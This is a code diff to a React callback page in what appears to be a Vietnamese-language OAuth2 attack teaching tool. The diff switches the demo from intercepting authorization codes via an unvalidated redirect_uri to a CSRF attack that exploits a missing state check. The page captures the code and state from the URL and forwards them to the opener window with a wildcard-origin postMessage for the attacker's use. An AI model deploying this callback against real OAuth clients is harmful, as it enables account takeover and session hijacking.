@@ -13,7 +13,7 @@ export default function CallbackPage() {
     const state = searchParams.get('state') || ''
     setParams({ code, state })
 
-    // Gửi message cho parent window nếu đây là popup window
+    // Gửi message cho parent window (attack page) kèm code VÀ state
     if (window.opener) {
       window.opener.postMessage({ type: 'OAUTH_CODE_INTERCEPTED', code, state }, '*')
     }
@@ -37,56 +37,75 @@ export default function CallbackPage() {
       justifyContent: 'center',
       padding: '20px'
     }}>
-      <div className="card" style={{ maxWidth: '600px', width: '100%', border: '1px solid #dc2626', boxShadow: '0 0 15px rgba(220, 38, 38, 0.3)' }}>
+      <div className="card" style={{ maxWidth: '620px', width: '100%', border: '1px solid #dc2626', boxShadow: '0 0 15px rgba(220, 38, 38, 0.3)' }}>
         <div style={{ display: 'flex', alignItems: 'center', gap: '10px', borderBottom: '1px solid #dc2626', paddingBottom: '10px', marginBottom: '20px' }}>
           <div>
             <h1 style={{ fontSize: '20px', margin: 0, color: '#ef4444', fontWeight: 800 }}>
-              AUTH CODE INTERCEPTED!
+              CSRF CALLBACK RECEIVED!
             </h1>
             <p style={{ margin: 0, fontSize: '11px', color: '#94a3b8' }}>
-              OAuth2 Authorization Code Interception (Attacker Callback Endpoint)
+              OAuth2 CSRF Attack — Thiếu validate state parameter
             </p>
           </div>
         </div>
 
         <p style={{ fontSize: '13px', color: '#cbd5e1', lineHeight: '1.6', marginBottom: '16px' }}>
-          Hệ thống OAuth2 Server đã chuyển hướng User (với authorization code nhạy cảm) về URL của Hacker vì <strong style={{ color: '#f59e0b' }}>redirect_uri không được validate whitelist</strong>.
+          Victim đã đăng nhập bằng tài khoản của mình, nhưng Authorization Code được cấp theo
+          <strong style={{ color: '#f59e0b' }}> authorization request của Attacker</strong>.
+          Nếu Client không validate <code style={{ color: '#ef4444' }}>state</code> → session của Victim bị bind với account Attacker!
         </p>
 
         <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
           <div style={{ background: '#090d16', padding: '12px', borderRadius: '6px', border: '1px solid #334155' }}>
-            <span style={{ color: '#3b82f6', fontWeight: 'bold' }}>Captured Code:</span>
-            <div style={{ color: '#22c55e', fontSize: '16px', fontWeight: 'bold', marginTop: '6px', wordBreak: 'break-all' }}>
+            <span style={{ color: '#3b82f6', fontWeight: 'bold' }}>Authorization Code:</span>
+            <div style={{ color: '#22c55e', fontSize: '15px', fontWeight: 'bold', marginTop: '6px', wordBreak: 'break-all' }}>
               {params.code || '(null / empty)'}
             </div>
           </div>
 
-          <div style={{ background: '#090d16', padding: '12px', borderRadius: '6px', border: '1px solid #334155' }}>
-            <span style={{ color: '#3b82f6', fontWeight: 'bold' }}>State:</span>
-            <div style={{ color: '#f59e0b', fontSize: '14px', marginTop: '6px', wordBreak: 'break-all' }}>
-              {params.state || '(null / empty)'}
+          <div style={{ background: '#090d16', padding: '12px', borderRadius: '6px', border: params.state ? '1px solid #3b82f6' : '1px solid #dc2626' }}>
+            <span style={{ color: '#3b82f6', fontWeight: 'bold' }}>State Parameter:</span>
+            <div style={{ fontSize: '13px', fontWeight: 'bold', marginTop: '6px', wordBreak: 'break-all', color: params.state ? '#3b82f6' : '#ef4444' }}>
+              {params.state || '(trống — KHÔNG có state)'}
+            </div>
+            <div style={{ marginTop: 6, fontSize: 11, color: params.state ? '#94a3b8' : '#f87171' }}>
+              {params.state
+                ? `ℹ️ State="${params.state}" — Client cần kiểm tra xem state này có khớp với session không`
+                : '⚠️ Không có state → Client không thể phân biệt đây là CSRF hay request hợp lệ!'
+              }
             </div>
           </div>
         </div>
 
-        <div style={{ display: 'flex', gap: '10px', marginTop: '24px' }}>
+        <div style={{
+          marginTop: 16,
+          padding: '12px',
+          background: 'rgba(239, 68, 68, 0.08)',
+          borderRadius: 6,
+          fontSize: 12,
+          color: '#fbbf24',
+          lineHeight: 1.7
+        }}>
+          <strong>📋 Kết quả:</strong><br/>
+          Code này thuộc authorization request của <strong style={{ color: '#ef4444' }}>Attacker</strong>,
+          không phải của Victim. Nếu Client dùng code này để đổi lấy token → session của Victim
+          sẽ bind với tài khoản Google của Attacker!
+        </div>
+
+        <div style={{ display: 'flex', gap: '10px', marginTop: '16px' }}>
           <button className="btn btn-danger" onClick={copyToClipboard} style={{ flex: 1 }}>
-            {copied ? 'Copied' : 'Copy JSON data'}
+            {copied ? '✅ Copied!' : 'Copy JSON'}
           </button>
-          
+
           {window.opener ? (
             <button className="btn btn-ghost" onClick={() => window.close()} style={{ flex: 1, border: '1px solid #475569' }}>
-              Close Window
+              Đóng & Quay lại Attack Tool
             </button>
           ) : (
             <button className="btn btn-ghost" onClick={() => nav('/oauth2')} style={{ flex: 1, border: '1px solid #475569' }}>
               Return to Hacker Tool
             </button>
           )}
-        </div>
-
-        <div style={{ marginTop: '20px', padding: '12px', background: 'rgba(239, 68, 68, 0.1)', borderRadius: '6px', fontSize: '12px', color: '#f87171' }}>
-          <strong>Lưu ý:</strong> Dữ liệu code này đã được gửi về giao diện điều khiển chính của Hacker Tool. Bạn có thể quay lại tab cũ để tiến hành đổi code lấy Access Token và truy xuất User Profile.
         </div>
       </div>
     </div>
